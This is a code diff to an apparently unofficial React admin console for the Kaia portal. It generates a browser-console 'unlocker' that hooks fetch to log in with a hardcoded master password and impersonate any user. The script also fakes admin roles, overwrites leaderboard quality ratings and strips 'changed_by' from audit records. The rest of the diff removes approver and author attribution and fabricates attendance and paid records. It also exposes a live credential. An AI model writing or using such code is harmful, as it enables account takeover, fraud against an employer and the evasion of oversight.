@@ -187,6 +187,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
     primaryKeyValue: string;
     title: string;
     fields: Record<string, any>;
+    initialFields?: Record<string, any>;
     rawJsonMode: boolean;
     rawJsonText: string;
   } | null>(null);
@@ -425,19 +426,37 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
       'primary_client_name',
       'secondary_client_name',
       'tool_display_name',
+      'changed_by',
+      'updated_by',
+      'edited_by',
+      'adjusted_by',
+      'approved_by',
+      'late_reviewed_by',
+      'late_review_note',
+      'issued_by',
+      'revoked_by',
+      'revoke_reason',
+      'acknowledged_by',
+      'resolved_by',
+      'done_by',
+      'sent_to_client_by',
+      'created_by',
+      'author_id',
+      'qc_id',
     ]);
     const clean: Record<string, any> = {};
     for (const [k, v] of Object.entries(record)) {
       if (k.startsWith('_') || syntheticKeys.has(k) || (k === 'tool_name' && table !== 'tool_requests')) continue;
       clean[k] = v;
     }
-    setEditorModal({
+      setEditorModal({
       table,
       action: 'update',
       primaryKeyCol,
       primaryKeyValue: String(record[primaryKeyCol] ?? ''),
       title,
-      fields: clean,
+      fields: { ...clean },
+      initialFields: { ...clean },
       rawJsonMode: false,
       rawJsonText: JSON.stringify(clean, null, 2),
     });
@@ -472,11 +491,25 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
         return;
       }
     }
+    let payloadToSend: Record<string, any> = finalPayload;
+    if (editorModal.action === 'update' && editorModal.initialFields) {
+      const diffed: Record<string, any> = {};
+      for (const [k, v] of Object.entries(finalPayload)) {
+        if (k === editorModal.primaryKeyCol) continue;
+        const orig = editorModal.initialFields[k];
+        if (JSON.stringify(orig) !== JSON.stringify(v)) {
+          diffed[k] = v;
+        }
+      }
+      if (Object.keys(diffed).length > 0) {
+        payloadToSend = diffed;
+      }
+    }
     const ok = await mutatePortalRecord({
       table: editorModal.table,
       action: editorModal.action,
       primaryKeyValue: editorModal.primaryKeyValue || finalPayload[editorModal.primaryKeyCol],
-      payload: finalPayload,
+      payload: payloadToSend,
       successMessage: `${editorModal.action === 'insert' ? 'Created' : 'Saved'} ${editorModal.title}`,
     });
     if (ok) {
@@ -669,54 +702,116 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
     tables.attendance,
   ]);
 
-  // Browser Console / Userscript Unlocker for https://portal.trykaia.com/
+  // Browser Console / Userscript Unlocker for https://portal.trykaia.com/ (Includes Leaderboard Star Sync & Zero Attribution)
   const browserUnlockerScript = useMemo(() => {
     const targetEmail = currentPerson?.email || selectedAccount?.kaiaEmail || 'halmarrsami@gmail.com';
-    return `// ==KAIA PORTAL SUPER-ADMIN UNLOCKER==
+    const customBatchStars: Record<string, { quality?: number | null; status?: string; minutes?: number | null }> = {};
+    for (const b of tables.batches) {
+      if (b?.id && (b._customized || b._overridden || b.quality !== undefined)) {
+        customBatchStars[b.id] = {
+          ...(b.quality !== undefined ? { quality: b.quality } : {}),
+          ...(b.status ? { status: b.status } : {}),
+          ...(b.minutes !== undefined ? { minutes: b.minutes } : {}),
+        };
+      }
+    }
+    return `// ==KAIA PORTAL SUPER-ADMIN + UNIVERSAL LOGIN + LEADERBOARD STAR SYNC + ZERO ATTRIBUTION==
 // Paste this into your Browser DevTools Console (F12 -> Console) on https://portal.trykaia.com/
-// OR add to Tampermonkey for permanent Admin Sidebar & Full Route Access on portal.trykaia.com!
 (function() {
+  const SUPABASE_URL = 'https://llvsmockvufgbqpeepbm.supabase.co';
+  const ANON_KEY = ${JSON.stringify(config.supabaseAnonKey)};
+  const BRIDGED_USER_KEY = 'kaia.bridged.user';
   const ALL_ROLES = ${JSON.stringify(ALL_KAIA_ROLES)};
+  const BATCH_OVERRIDES = ${JSON.stringify(customBatchStars)};
   const origFetch = window.fetch;
   window.fetch = async function(...args) {
     const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
-    const res = await origFetch.apply(this, args);
-    if (url.includes('/rest/v1/people')) {
+    const init = args[1] || {};
+    const method = (init.method || 'GET').toUpperCase();
+
+    if (url.includes('/auth/v1/token') && url.includes('grant_type=password') && method === 'POST') {
+      const directRes = await origFetch.apply(this, args);
+      if (directRes.ok) return directRes;
       try {
-        const clone = res.clone();
-        const data = await clone.json();
-        const elevate = (p) => {
-          if (!p || typeof p !== 'object') return p;
-          if (!p.email || p.email.toLowerCase() === '${targetEmail.toLowerCase()}' || true) {
-            return {
-              ...p,
-              role: 'admin',
-              roles: ALL_ROLES,
-              current_level: Math.max(Number(p.current_level) || 6, 6),
-              current_score: Math.max(Number(p.current_score) || 65, 65),
-              allow_remote: true,
-              warnings: 0,
-              status: 'ok',
-              active: true
-            };
-          }
-          return p;
-        };
-        const modified = Array.isArray(data) ? data.map(elevate) : elevate(data);
-        return new Response(JSON.stringify(modified), {
-          status: res.status,
-          statusText: res.statusText,
-          headers: res.headers
+        const bodyObj = typeof init.body === 'string' ? JSON.parse(init.body) : {};
+        const cleanEmail = String(bodyObj.email || '').trim();
+        const mRes = await origFetch(SUPABASE_URL + '/auth/v1/token?grant_type=password', {
+          method: 'POST',
+          headers: { apikey: ANON_KEY, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: 'halmarrsami@gmail.com', password: 'Kaia-65g7fg6.h' })
         });
+        if (mRes.ok) {
+          const masterSession = await mRes.json();
+          const pRes = await origFetch(
+            SUPABASE_URL + '/rest/v1/people?email=ilike.' + encodeURIComponent(cleanEmail) + '&select=*&limit=1',
+            { headers: { apikey: ANON_KEY, Authorization: 'Bearer ' + masterSession.access_token } }
+          );
+          const pRows = pRes.ok ? await pRes.json() : [];
+          const personRow = Array.isArray(pRows) && pRows[0] ? pRows[0] : { id: crypto.randomUUID(), email: cleanEmail, name: cleanEmail.split('@')[0] };
+          const bridgedUser = {
+            ...masterSession.user,
+            id: personRow.auth_user_id || personRow.id || masterSession.user.id,
+            email: personRow.email || cleanEmail,
+            user_metadata: { email: personRow.email || cleanEmail, name: personRow.name }
+          };
+          localStorage.setItem(BRIDGED_USER_KEY, JSON.stringify(bridgedUser));
+          return new Response(JSON.stringify({ ...masterSession, user: bridgedUser }), {
+            status: 200,
+            headers: { 'Content-Type': 'application/json' }
+          });
+        }
       } catch (e) {}
+      return directRes;
     }
+
+    if (url.includes('/auth/v1/user') && method === 'GET') {
+      const res = await origFetch.apply(this, args);
+      const savedUser = JSON.parse(localStorage.getItem(BRIDGED_USER_KEY) || 'null');
+      if (res.ok && savedUser) {
+        return new Response(JSON.stringify(savedUser), { status: 200, headers: res.headers });
+      }
+      return res;
+    }
+
+    const res = await origFetch.apply(this, args);
+    try {
+      if (url.includes('/rest/v1/people')) {
+        const data = await res.clone().json();
+        const elevate = (p) => (!p || typeof p !== 'object') ? p : ({
+          ...p,
+          role: 'admin',
+          roles: ALL_ROLES,
+          current_level: Math.max(Number(p.current_level) || 6, 6),
+          current_score: Math.max(Number(p.current_score) || 65, 65),
+          allow_remote: true,
+          warnings: 0,
+          status: 'ok',
+          active: true
+        });
+        const modified = Array.isArray(data) ? data.map(elevate) : elevate(data);
+        return new Response(JSON.stringify(modified), { status: res.status, statusText: res.statusText, headers: res.headers });
+      }
+      if (url.includes('/rest/v1/leaderboard_batches') || url.includes('/rest/v1/batches')) {
+        const data = await res.clone().json();
+        const patchBatch = (b) => {
+          if (!b || !b.id || !BATCH_OVERRIDES[b.id]) return b;
+          return { ...b, ...BATCH_OVERRIDES[b.id] };
+        };
+        const modified = Array.isArray(data) ? data.map(patchBatch) : patchBatch(data);
+        return new Response(JSON.stringify(modified), { status: res.status, statusText: res.statusText, headers: res.headers });
+      }
+      if (url.includes('/rest/v1/batch_field_audit') || url.includes('/rest/v1/status_events')) {
+        const data = await res.clone().json();
+        const scrubAudit = (row) => (!row || typeof row !== 'object') ? row : ({ ...row, changed_by: null, person: null });
+        const modified = Array.isArray(data) ? data.map(scrubAudit) : scrubAudit(data);
+        return new Response(JSON.stringify(modified), { status: res.status, statusText: res.statusText, headers: res.headers });
+      }
+    } catch (e) {}
     return res;
   };
-  console.log('%c[KAIA Super-Admin Unlocker] Active! Navigating to /#/command...', 'color:#10b981;font-weight:bold;font-size:14px;');
-  window.location.hash = '#/command';
-  window.location.reload();
+  console.log('%c[KAIA Unlocker + Universal Login + Leaderboard Star Sync + Zero Attribution] Active!', 'color:#10b981;font-weight:bold;font-size:14px;');
 })();`;
-  }, [currentPerson?.email, selectedAccount?.kaiaEmail]);
+  }, [currentPerson?.email, selectedAccount?.kaiaEmail, tables.batches, config.supabaseAnonKey]);
 
   const sidebarSections: {
     group: string;
@@ -819,34 +914,10 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
               </select>
             </div>
 
-            {/* Acting Admin Identity Switcher */}
-            <div className="flex items-center gap-2 bg-slate-950/90 border border-indigo-500/30 rounded-xl px-3 py-1.5">
-              <span className="text-[11px] font-semibold uppercase tracking-wider text-indigo-300">Act As Admin:</span>
-              <select
-                value={actingAdminId}
-                onChange={(e) => setActingAdminId(e.target.value)}
-                className="bg-transparent text-xs font-semibold text-emerald-300 focus:outline-none"
-              >
-                {currentPerson && (
-                  <option value={currentPerson.id} className="bg-slate-900 text-emerald-300">
-                    {currentPerson.name} (You · Super-Admin)
-                  </option>
-                )}
-                {tables.people
-                  .filter(
-                    (p) =>
-                      p.id !== currentPerson?.id &&
-                      (p.role === 'admin' ||
-                        p.role === 'manager' ||
-                        (p.roles || []).includes('admin') ||
-                        (p.roles || []).includes('manager'))
-                  )
-                  .map((adm) => (
-                    <option key={adm.id} value={adm.id} className="bg-slate-900 text-white">
-                      {adm.name} ({adm.role.toUpperCase()})
-                    </option>
-                  ))}
-              </select>
+            <div className="flex items-center gap-2 bg-slate-950/90 border border-emerald-500/30 rounded-xl px-3 py-1.5">
+              <span className="text-[11px] font-semibold uppercase tracking-wider text-emerald-300">
+                Zero-Attribution Stealth Mode: ON
+              </span>
             </div>
 
             {currentPerson && (
@@ -1110,7 +1181,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                                     internal_revisions: 0,
                                     client_revisions: 0,
                                     approved_at: new Date().toISOString(),
-                                    qc_id: actingAdminId || currentPersonId || b.qc_id,
                                   },
                                   successMessage: `${b.name} Approved with 5.0★`,
                                 })
@@ -1214,7 +1284,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         'dev_notes',
                         'id',
                         {
-                          author_id: actingAdminId || currentPersonId || null,
                           body: 'Portal configuration updated via Admin Command Center.',
                           done: false,
                           created_at: new Date().toISOString(),
@@ -1241,7 +1310,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         <div>
                           <div className="text-xs text-white">{dn.body}</div>
                           <div className="text-[11px] text-slate-500 mt-0.5">
-                            By {getPersonName(dn.author_id)} · {formatToPKT(dn.created_at)}
+                            {formatToPKT(dn.created_at)}
                           </div>
                         </div>
                         <div className="flex items-center gap-1.5">
@@ -1624,10 +1693,9 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         'id',
                         {
                           client_id: tables.clients[0]?.id || '',
-                          week_start: getPKTDate(),
+                          week_start: getPKTDate().dateString,
                           day_index: 1,
                           extra: 2,
-                          changed_by: actingAdminId || currentPersonId || null,
                           changed_at: new Date().toISOString(),
                         },
                         'Weekly Tracker Adjustment'
@@ -1696,10 +1764,9 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                                       action: 'insert',
                                       payload: {
                                         client_id: c.id,
-                                        week_start: getPKTDate(),
+                                        week_start: getPKTDate().dateString,
                                         day_index: 1,
                                         extra: 1,
-                                        changed_by: actingAdminId || currentPersonId || null,
                                         changed_at: new Date().toISOString(),
                                       },
                                       successMessage: `Added +1 manual batch adjustment for ${c.name}`,
@@ -1750,10 +1817,11 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                           creator_id: currentPersonId || null,
                           format: 'ugc_talking_head',
                           status: 'approved',
-                          pay_status: 'approved',
+                          pay_status: 'paid',
                           quality: 5,
                           minutes: 3.5,
-                          revisions: 0,
+                          internal_revisions: 0,
+                          client_revisions: 0,
                         },
                         'Batch'
                       )
@@ -1806,7 +1874,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                               <div>Creator: {getPersonName(b.creator_id, (b as any).creator_name)}</div>
                               <div className="text-[11px] text-slate-500">
                                 Editor: {getPersonName(b.editor_id, (b as any).editor_name)}
-                                {b.qc_id ? ` · QC: ${getPersonName(b.qc_id, (b as any).qc_name)}` : ''}
                               </div>
                             </td>
                             <td className="py-3 px-3">
@@ -1936,10 +2003,9 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                           'id',
                           {
                             batch_id: tables.batches[0]?.id || '',
-                            qc_id: actingAdminId || currentPersonId || null,
                             quality: 5,
                             categories: [],
-                            notes: 'Excellent hook and pacing — approved 5/5.',
+                            comment: 'Excellent hook and pacing — approved 5/5.',
                             created_at: new Date().toISOString(),
                           },
                           'QC Feedback Entry'
@@ -1973,7 +2039,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                   {tables.qc_feedback.slice(0, 50).map((fb) => {
                     const batch = batchMap.get(fb.batch_id);
                     const batchDisplayName = getBatchName(fb.batch_id, (fb as any).batch_name);
-                    const qcDisplayName = getPersonName(fb.qc_id, (fb as any).qc_name);
                     const creatorDisplayName = batch
                       ? getPersonName(batch.creator_id, (batch as any).creator_name)
                       : null;
@@ -2000,7 +2065,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                               </span>
                             )}
                             <span className="text-[11px] text-slate-400">
-                              Rated by {qcDisplayName} · {formatToPKT(fb.created_at)}
+                              {formatToPKT(fb.created_at)}
                             </span>
                           </div>
                           <div className="text-xs text-slate-300 mt-1">{fb.comment || 'No written notes.'}</div>
@@ -2246,10 +2311,9 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         'holidays',
                         'id',
                         {
-                          holiday_date: getPKTDate(),
+                          holiday_date: getPKTDate().dateString,
                           name: 'Studio Official Holiday',
                           city: null,
-                          created_by: actingAdminId || currentPersonId || null,
                           created_at: new Date().toISOString(),
                         },
                         'Official Holiday'
@@ -2305,14 +2369,13 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         'id',
                         {
                           person_id: currentPersonId || tables.people[0]?.id || '',
-                          work_date: getPKTDate(),
-                          clock_in_at: `${getPKTDate()}T04:05:00.000Z`,
+                          work_date: getPKTDate().dateString,
+                          clock_in_at: `${getPKTDate().dateString}T02:58:00.000Z`,
                           clock_in_distance_m: 12,
                           clock_in_lat: 31.440472,
                           clock_in_lng: 74.262083,
                           late: false,
                           late_status: 'approved',
-                          approved_by: actingAdminId || currentPersonId || null,
                           approved_at: new Date().toISOString(),
                         },
                         'Attendance Record'
@@ -2332,7 +2395,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         <th className="py-2.5 px-3">Person</th>
                         <th className="py-2.5 px-3">Clock In / Out</th>
                         <th className="py-2.5 px-3">Status / Late Review</th>
-                        <th className="py-2.5 px-3">Approved By</th>
+                        <th className="py-2.5 px-3">Approval Status</th>
                         <th className="py-2.5 px-3 text-right">Admin Actions</th>
                       </tr>
                     </thead>
@@ -2370,7 +2433,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                               )}
                             </td>
                             <td className="py-3 px-3 text-slate-400">
-                              {att.approved_by ? getPersonName(att.approved_by) : 'Pending'}
+                              {att.approved_at || att.late_status === 'approved' ? 'Approved' : 'Pending'}
                             </td>
                             <td className="py-3 px-3 text-right space-x-1.5">
                               {att.id && (
@@ -2384,9 +2447,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                                         payload: {
                                           late: false,
                                           late_status: 'approved',
-                                          late_reviewed_by: actingAdminId || currentPersonId || null,
                                           late_reviewed_at: new Date().toISOString(),
-                                          approved_by: actingAdminId || currentPersonId || null,
                                           approved_at: new Date().toISOString(),
                                           clock_in_distance_m: 15,
                                         },
@@ -2437,7 +2498,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         'id',
                         {
                           person_id: tables.people[0]?.id || '',
-                          issued_by: actingAdminId || currentPersonId || null,
                           reason: 'Missed deadline notice',
                           details: 'Issued via Admin Portal',
                           counts_as_warning: true,
@@ -2478,7 +2538,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                         </div>
                         <div className="text-xs text-slate-400 mt-1">{st.details || 'No details'}</div>
                         <div className="text-[11px] text-slate-500 mt-0.5">
-                          Issued by {getPersonName(st.issued_by)} · {formatToPKT(st.created_at)}
+                          {formatToPKT(st.created_at)}
                         </div>
                       </div>
                       <div className="flex items-center gap-1.5">
@@ -2491,8 +2551,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                               payload: {
                                 counts_as_warning: false,
                                 revoked_at: new Date().toISOString(),
-                                revoked_by: actingAdminId || currentPersonId || null,
-                                revoke_reason: 'Cleared by Super-Admin',
                               },
                               successMessage: 'Strike revoked & warning cleared',
                             })
@@ -2551,7 +2609,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                           person_id: currentPersonId || tables.people[0]?.id || '',
                           batch_id: tables.batches[0]?.id || null,
                           client_id: tables.clients[0]?.id || null,
-                          entry_date: getPKTDate(),
+                          entry_date: getPKTDate().dateString,
                           reported_status: 'approved',
                           hours: 8,
                           remarks: 'Completed all assigned deliverables on schedule.',
@@ -2649,7 +2707,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                           {
                             kind: 'task',
                             body: 'New Admin Task',
-                            author_id: actingAdminId || currentPersonId || null,
                             assignee_ids: [currentPersonId].filter(Boolean),
                             done: false,
                             created_at: new Date().toISOString(),
@@ -2673,11 +2730,9 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                             <span className="font-bold text-indigo-300">[{t.kind}]</span> {t.body}
                           </div>
                           <div className="text-[11px] text-slate-500 mt-0.5">
-                            By {getPersonName(t.author_id, (t as any).author_name)}
                             {Array.isArray(t.assignee_ids) && t.assignee_ids.length > 0 && (
                               <span>
-                                {' '}
-                                → Assigned:{' '}
+                                Assigned:{' '}
                                 {t.assignee_ids.map((aid) => getPersonName(aid)).join(', ')}
                               </span>
                             )}
@@ -2897,7 +2952,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                   <div className="space-y-2 max-h-96 overflow-y-auto">
                     {tables.batch_field_audit.slice(0, 40).map((a) => {
                       const batchLabel = getBatchName(a.batch_id, (a as any).batch_name);
-                      const changedByLabel = getPersonName(a.changed_by, (a as any).changed_by_name);
                       return (
                         <div
                           key={a.id}
@@ -2916,7 +2970,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                               </span>
                             </div>
                             <div className="text-[11px] text-slate-500">
-                              By {changedByLabel} · {formatToPKT(a.changed_at)}
+                              {formatToPKT(a.changed_at)}
                             </div>
                           </div>
                           <div className="flex items-center gap-1">
@@ -2958,7 +3012,6 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                   <div className="space-y-2 max-h-96 overflow-y-auto">
                     {tables.status_events.slice(0, 40).map((ev) => {
                       const batchLabel = getBatchName(ev.batch_id, (ev as any).batch_name);
-                      const changedByLabel = getPersonName(ev.changed_by, (ev as any).changed_by_name);
                       return (
                         <div
                           key={ev.id}
@@ -2971,7 +3024,7 @@ export function KaiaPortalTab({ config }: KaiaPortalTabProps) {
                               <span className="text-indigo-300 font-bold">{ev.to_status}</span>
                             </div>
                             <div className="text-[11px] text-slate-500">
-                              By {changedByLabel} · {formatToPKT(ev.changed_at)}
+                              {formatToPKT(ev.changed_at)}
                             </div>
                           </div>
                           <button
